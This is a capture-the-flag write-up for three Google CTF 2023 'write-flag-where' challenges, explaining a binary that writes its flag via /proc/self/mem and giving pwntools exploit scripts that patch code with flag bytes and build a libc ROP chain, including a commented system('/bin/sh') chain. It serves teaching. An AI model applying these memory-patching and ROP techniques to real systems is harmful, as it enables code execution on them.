# Google CTF writeups

> 2023-06-26

# Write-flag-where{,2,3}

The three challenges are variations of the same binary, with an interesting idea: we can write the flag content anywhere in the binary, and the difficulty of displaying the flag increases gradually.

## First Challenge

We did not receive the source code of the binary and when we execute it, it seems to do nothing. Let's proceed with a simple analysis.

```bash
r3tr0@pwnmachine:~$ strace ./chal
execve("./chal", ["./chal"], 0x7ffc7c2c8af0 /* 72 vars */) = 0
...
openat(AT_FDCWD, "/proc/self/maps", O_RDONLY) = 3
read(3, "55fc9bd98000-55fc9bd99000 r--p 0"..., 4096) = 2607
close(3)                                = 0
openat(AT_FDCWD, "./flag.txt", O_RDONLY) = 3
read(3, "CTF{fake-flag}\n", 128)        = 15
close(3)                                = 0
dup2(1, 1337)                           = -1 EBADF (Bad file descriptor)
openat(AT_FDCWD, "/dev/null", O_RDWR)   = 3
dup2(3, 0)                              = 0
dup2(3, 1)                              = 1
dup2(3, 2)                              = 2
close(3)                                = 0
alarm(60)                               = 0
...
lseek(-1, 0, SEEK_CUR)                  = -1 EBADF (Bad file descriptor)
lseek(-1, 0, SEEK_CUR)                  = -1 EBADF (Bad file descriptor)
lseek(-1, 0, SEEK_CUR)                  = -1 EBADF (Bad file descriptor)
read(-1, 0x7ffccb5a3300, 64)            = -1 EBADF (Bad file descriptor)
exit_group(0)                           = ?
+++ exited with 0 +++
```

Just by taking a look at the strace output, we can understand what is happening. The binary opens `/proc/self/maps`, `./flag.txt`, and `/dev/null`, then executes `dup2(stdout, 1337)` and `dup2(dev_null_fd, {0,1,3})`. The error occurs on `dup2 1337`, as we can see the return of "Bad file descriptor". This happens because by default we cannot have fd's greater than 1024, but we can change this with: `ulimit -n 2048`.

Re-executing the binary now will result in this:

```bash
r3tr0@pwnmachine:~$ ./chal
This challenge is not a classical pwn
In order to solve it will take skills of your own
An excellent primitive you get for free
Choose an address and I will write what I see
But the author is cursed or perhaps it's just out of spite
For the flag that you seek is the thing you will write
ASLR isn't the challenge so I'll tell you what
I'll give you my mappings so that you'll have a shot.
559ce12ba000-559ce12bb000 r--p 00000000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12bb000-559ce12bc000 r-xp 00001000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12bc000-559ce12bd000 r--p 00002000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12bd000-559ce12be000 r--p 00002000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12be000-559ce12bf000 rw-p 00003000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
559ce12bf000-559ce12c0000 rw-p 00000000 00:00 0 
559ce12c0000-559ce12c1000 rw-p 00005000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal
7f3a6b091000-7f3a6b094000 rw-p 00000000 00:00 0 
7f3a6b094000-7f3a6b0bc000 r--p 00000000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b0bc000-7f3a6b251000 r-xp 00028000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b251000-7f3a6b2a9000 r--p 001bd000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b2a9000-7f3a6b2ad000 r--p 00214000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b2ad000-7f3a6b2af000 rw-p 00218000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6
7f3a6b2af000-7f3a6b2be000 rw-p 00000000 00:00 0 
7f3a6b2be000-7f3a6b2c0000 r--p 00000000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7f3a6b2c0000-7f3a6b2ea000 r-xp 00002000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7f3a6b2ea000-7f3a6b2f5000 r--p 0002c000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7f3a6b2f6000-7f3a6b2f8000 r--p 00037000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7f3a6b2f8000-7f3a6b2fa000 rw-p 00039000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so
7ffc1e28c000-7ffc1e2ad000 rw-p 00000000 00:00 0                          [stack]
7ffc1e2b4000-7ffc1e2b8000 r--p 00000000 00:00 0                          [vvar]
7ffc1e2b8000-7ffc1e2ba000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]

Give me an address and a length just so:
<address> <length>
And I'll write it wherever you want it to go.
If an exit is all that you desire
Send me nothing and I will happily expire
```

At this moment, we will do reversing to better understand:

```c
// extracted from ida64 with renamed vars
...
  close(flag_fd);
  new_stdout = dup2(1, 1337);
  dev_null_fd = open("/dev/null", 2);
  dup2(dev_null_fd, 0);
  dup2(dev_null_fd, 1);
  dup2(dev_null_fd, 2);
  close(dev_null_fd);
  alarm(60u);
  dprintf(new_stdout,
          "This challenge is not a classical pwn\n"
          "In order to solve it will take skills of your own\n"
          "An excellent primitive you get for free\n"
          "Choose an address and I will write what I see\n"
          "But the author is cursed or perhaps it's just out of spite\n"
          "For the flag that you seek is the thing you will write\n"
          "ASLR isn't the challenge so I'll tell you what\n"
          "I'll give you my mappings so that you'll have a shot.\n");
  dprintf(new_stdout, "%s\n\n", maps);
  while (1) {
    dprintf(new_stdout,
            "Give me an address and a length just so:\n"
            "<address> <length>\n"
            "And I'll write it wherever you want it to go.\n"
            "If an exit is all that you desire\n"
            "Send me nothing and I will happily expire\n");
    buf[0] = 0LL;
    buf[1] = 0LL;
    buf[2] = 0LL;
    buf[3] = 0LL;
    buf[4] = 0LL;
    buf[5] = 0LL;
    buf[6] = 0LL;
    buf[7] = 0LL;
    nr = read(new_stdout, buf, 64u);
    if ((unsigned int)__isoc99_sscanf(buf, "0x%llx %u", &n[1], n) != 2 ||
        n[0] > 127u)
      break;
    v6 = open("/proc/self/mem", 2);
    lseek64(v6, *(__off64_t *)&n[1], 0);
    write(v6, &flag_buf, n[0]);
    close(v6);
  }
  exit(0);
...
```

The code will read from the user an address (addr) and a size (num) and then write ***num*** bytes of the flag at address **addr**.

Let's start with a quick explanation about `dup2` and `/proc/self/mem`.

### dup2

The dup2 syscall is used to clone a file descriptor (fd). It is simple to use with an interesting purpose. So, in our example, the call `dup2(1, 1337);` will create a copy of stdout to fd 1337, then by doing `write(1337, buf, n);`, the result will be written to the *stdout*. The same happens with the `dup2(dev_null_fd, 1);`, we are overwriting the default stdout fd to the fd of `/dev/null`.

We can see all changes at `/proc/<pid>/fd`:

```bash
r3tr0@pwnmachine:~$ ls -la /proc/$(pgrep chal)/fd
total 0
dr-x------ 2 r3tr0 r3tr0  0 jun 25 17:09 .
dr-xr-xr-x 9 r3tr0 r3tr0  0 jun 25 17:08 ..
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 0 -> /dev/null
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 1 -> /dev/null
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 1337 -> /dev/pts/0
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 2 -> /dev/null
lrwx------ 1 r3tr0 r3tr0 64 jun 25 17:09 4 -> 'socket:[40316]'
```

### /proc/self/mem

This pseudo-file in the proc filesystem maps the memory of your process, so we can directly read the binary that is loaded in memory and also edit it. There are no permissions or memory restrictions such as "read-only memory" or "read/exec memory." We can overwrite anything inside the binary in memory by writing to this file, including the .text or .rodata sections.

---

With that being said, it becomes clearer what we need to do. In this first challenge, the only thing we need to do is overwrite the flag on top of the string "Give me an address and a length just so", exploit:

```python
# pwn template ./chal --host wfw1.2023.ctfcompetition.com --port 1337
...
io = start()

io.recvuntil(b"I'll give you my mappings so that you'll have a shot.")
maps = io.recvuntil(b'\n\n')

elf_base = parse_maps(maps)
log.info('Elf base: ' + hex(elf_base))
pause()

io.recvuntil(b'Send me nothing and I will happily expire')

string_addr = elf_base + 0x21e0
io.sendline(f'{hex(string_addr)} 100'.encode())

io.interactive()
```

## Second challenge

In the second challenge, things get a bit more complicated. We no longer have a string to overwrite, and the only difference from the previous challenge is the removal of the `dprintf` with the string "Give me an address and a length just so".

We thought about causing some error within the libc, like an abort from `malloc("free(): double free detected in tcache 2")`. Furthermore, we could overwrite this string in the libc and force any type of error, but it didn't work. As we saw before, when trying to write to *stderr*, the output will be redirected to **`/dev/null`**.

While trying to find new targets to write the flag, I was reading the strings of the binary and found something interesting:

```bash
r3tr0@pwnmachine:~$ strings ./chal
...
Somehow you got here??
...
```

I hadn't seen this string until now. Where is it located? Is it some kind of secret code? With IDA, I could see that there was a disconnected code block from the program flow, but in radare2, it became much clearer.

```bash
r3tr0@pwnmachine:~$ r2 -AA ./chal_patched
...
[0x00001100]> pdg @ main

// WARNING: Variable defined which should be unmapped: fildes
// WARNING: Could not reconcile some variable overlaps

ulong main(void)

{
    int32_t iVar1;
    ulong uVar2;
    int64_t iVar3;
    ulong buf;
    ulong var_68h;
    ulong var_60h;
    ulong var_58h;
    ulong var_50h;
    ulong var_48h;
    ulong var_40h;
    ulong var_38h;
    ulong nbytes;
    uint fd;
    uint var_14h;
    uint var_10h;
    uint var_ch;
    int32_t var_8h;
    ulong fildes;
    
    fildes._0_4_ = sym.imp.open("/proc/self/maps", 0);
    sym.imp.read(fildes, obj.maps, 0x1000);
    sym.imp.close(fildes);
    var_8h = sym.imp.open("./flag.txt", 0);
    if (var_8h == -1) {
        sym.imp.puts("flag.txt not found");
        uVar2 = 1;
    }
    else {
        iVar3 = sym.imp.read(var_8h, obj.flag, 0x80);
        if (iVar3 < 1) {
            sym.imp.puts("flag.txt empty");
            uVar2 = 1;
        }
        else {
            sym.imp.close(var_8h);
            var_ch = sym.imp.dup2(1, 0x539);
            var_10h = sym.imp.open("/dev/null", 2);
            sym.imp.dup2(var_10h, 0);
            sym.imp.dup2(var_10h, 1);
            sym.imp.dup2(var_10h, 2);
            sym.imp.close(var_10h);
            sym.imp.alarm(0x3c);
            sym.imp.dprintf(var_ch, 
                            "Was that too easy? Let\'s make it tough\nIt\'s the challenge from before, but I\'ve removed all the fluff\n"
                           );
            sym.imp.dprintf(var_ch, "%s\n\n", obj.maps);
            while( true ) {
                buf = 0;
                var_68h = 0;
                var_60h = 0;
                var_58h = 0;
                var_50h = 0;
                var_48h = 0;
                var_40h = 0;
                var_38h = 0;
                var_14h = sym.imp.read(var_ch, &buf, 0x40);
                iVar1 = sym.imp.__isoc99_sscanf(&buf, "0x%llx %u", &nbytes + 4, &nbytes);
                if ((iVar1 != 2) || (0x7f < nbytes)) break;
                fd = sym.imp.open("/proc/self/mem", 2);
                sym.imp.lseek64(fd, stack0xffffffffffffffd8, 0);
                sym.imp.write(fd, obj.flag, nbytes);
                sym.imp.close();
            }
            sym.imp.exit(0);
# [] After the exit there is more code
            sym.imp.dprintf(var_ch, "Somehow you got here??\n");
            uVar2 = sym.imp.abort();
        }
    }
    return uVar2;
}
[0x00001100]>
```

Perfect! Now we have a target. We overwrite the string "Somehow you got here??" with our flag, and then we "jump over" the `exit` function.

To bypass the `call exit`, I used the flag pattern to write an instruction. Since we can choose how many bytes we want to write, let's overwrite the "call exit" with "CCCCT":

```bash
r3tr0@pwnmachine:~$ python3
...
>>> hex(ord('C')), hex(ord('T'))
('0x43', '0x54')
r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4343434354
push r12
```

With this, we can bypass the `call exit` and reach the desired `dprintf`.

Final exploit:

```python
# pwn template ./chal --host wfw2.2023.ctfcompetition.com --port 1337
...
io = start()

io.recvuntil(b"It's the challenge from before, but I've removed all the fluff")
maps = io.recvuntil(b'\n\n')

elf_base = parse_maps(maps)
log.info('Elf start: ' + hex(elf_base))

# pause()
# ljust(0x40) for fill each read buffer
p = lambda x, y: (hex(x) + ' ' + str(y)).encode().ljust(0x40, b'\0')

string_addr = elf_base + 0x20d5
io.send(p(string_addr, 100))

# create push r12 from "C" and "CT" from flag
# two pushes are needed because of stack alignment

before_call_exit = elf_base + 0x143b
io.send(p(before_call_exit, 1))
io.send(p(before_call_exit+1, 1))
io.send(p(before_call_exit+2, 1))
io.send(p(before_call_exit+3, 2))

call_exit = elf_base + 0x1440
io.send(p(call_exit, 1))
io.send(p(call_exit+1, 1))
io.send(p(call_exit+2, 1))
io.send(p(call_exit+3, 2))

# force exit
io.sendline(b'asd')

io.interactive()
```

## Last challenge

This is the last and hardest challenge. Now we can no longer write inside the ELF. There is an if statement that checks if the entered address is not within the range of the binary. In other words, we must now read the flag by only writing within the libc.

We considered once again forcing an error within the libc to write the flag. The idea was to write to **`_IO_2_1_stderr_`** and change the **`_fd`** field to 1337. This would work... but we can't write the value 1337 directly. We can only write combinations of "C", "CT", "CTF" and "CTF{".

While my teammate @delcon_maki and I were trying to figure out what instructions we could create, we found something useful:

```python
r3tr0@pwnmachine:~$ python3
>>> hex(ord('C')), hex(ord('T')), hex(ord('F')), hex(ord('{'))
('0x43', '0x54', '0x46', '0x7b')

# 0x43 54 46 7b 43 54
#   C  T  F  {  C  T
r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4354467b4354 
push r12
jnp 0x48
push rsp
```

The "jnp" instruction performs a jump if PF=0. With this, we can write an exploit following the following plan:

- Overwrite the first instructions of **`exit`** within the libc and skip the creation of the stack frame.
- Enter the adjacent function and wait until we reach the "ret" instruction.
- Write a ROP (Return-Oriented Programming) chain.
- Profit! :D

```python
# pwn template ./chal --host wfw3.2023.ctfcompetition.com --port 1337
...
io = start()

io.recvuntil(b"For otherwise I will surely expire")
maps = io.recvuntil(b'\n\n')

libc_base, elf_base = parse_maps(maps)
libc.address = libc_base
exe.address = elf_base

log.info('Libc base: ' + hex(libc_base))
log.info('Elf base: ' + hex(exe.address))

# pause()
p = lambda x, y: (hex(x) + ' ' + str(y)).encode().ljust(0x40, b'\0')

__run_exit_handlers = libc.address + 0x4560b
io.send(p(__run_exit_handlers, 1))
io.send(p(__run_exit_handlers + 1, 1))
io.send(p(__run_exit_handlers + 2, 1))
io.send(p(__run_exit_handlers + 3, 2))

exit_addr = libc.address + 0x455f0
io.send(p(exit_addr, 4))
io.send(p(exit_addr+4, 2))
# 0x43 54 46 7b 43 54
#   C  T  F  {  C  T

pop_rdi = libc.address + 0x2a3e5
system_addr = libc.address + 0x50d60
bin_sh_addr = libc.address + 0x1d8698
# io.sendline(p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr))

rop = ROP(libc)

flag_location = exe.address + 0x50a0
rop.call('write', [1337, flag_location, 100])
log.info(rop.dump())
io.sendline(rop.chain())

io.interactive()
```

---

Next writeups soon...

# StoryGen

# UBF (Unnecessary Binary Format)

# Watthewasm
